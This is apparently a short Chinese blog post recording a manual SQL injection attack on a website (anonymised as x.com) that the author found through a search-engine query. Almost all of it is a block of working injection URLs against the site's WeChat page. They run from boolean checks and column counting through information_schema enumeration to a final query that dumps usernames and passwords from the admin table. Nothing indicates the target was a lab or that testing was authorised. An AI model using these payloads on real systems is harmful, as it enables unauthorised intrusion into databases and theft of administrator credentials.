---
title: 手工sql注入测试
tags: []
id: '423'
categories:
  - - linux
date: 2018-04-21 13:04:44
---

发现一个网址http://www.x.com/news-view-3.html，通过搜索引擎site:x.com找到了其微信页面id参数可注入

```
http://www.x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 #页面正常
http://www.x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 and 1=2 #页面不正常
http://www.x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 and 1=1 #页面正常
使用
http://x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 and 1=2 order by n--
判断出字段数，这里判断出来是8

使用
http://x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 and 1=2 union select 1,2,3,4,5,6,7,8--
判断出可显示在页面上的字段，这里是2和6

使用
http://x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1 and 1=2 union select 1,@@version,3,4,5,user(),7,8--
得到数据库版本和当前用户(当前数据库同理):mysql：5.0.95   sq_praticcnc@x.x.x.x  

使用
http://www.x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1%20and%201=2%20union%20select%201,concat(group_concat(distinct+table_name)),3,4,5,user(),7,8%20from%20information_schema.COLUMNS%20where%20column_name%20like%20%27%word%%27%20and%20table_schema=%27sq_praticcnc%27--
利用information_schema查询想要的数据库名，表名，列名

利用查到的数据库名，表名，列名查询数据
http://www.x.com/wx/mobile.php?module=product&userId=3&MenuId=13&action=view&Id=1%20and%201=2%20union%20select%201,concat_ws(0x3a,id,user,pass),3,4,5,user(),7,8%20from%20sq_praticcnc.admin%20limit%200,1--
```